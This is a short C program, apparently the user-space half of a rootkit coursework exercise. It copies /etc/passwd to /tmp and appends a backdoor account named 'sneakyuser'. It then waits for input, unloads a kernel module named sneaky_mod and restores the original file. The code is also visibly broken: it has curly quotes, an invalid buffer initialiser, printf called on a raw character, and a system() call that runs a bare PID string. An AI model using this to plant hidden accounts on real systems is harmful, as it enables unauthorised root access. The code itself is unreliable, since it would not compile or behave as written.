#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>

int main(){
    int pid = getpid();
    printf(“sneaky_process pid = %d\n”, pid);
    system("cp /etc/passwd /tmp");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
    char buffer[40]='0';
    char pidstr[12];
    sprintf(pidstr, "%d", pid);
    system(strcat(buffer, pidstr));
    int c;
    while((c=getchar())!='q'){
        printf(c);
    }
    system("rmmod sneaky_mod.ko");
    system("cp -f /tmp/passwd /etc");
    return EXIT_SUCCESS;
}
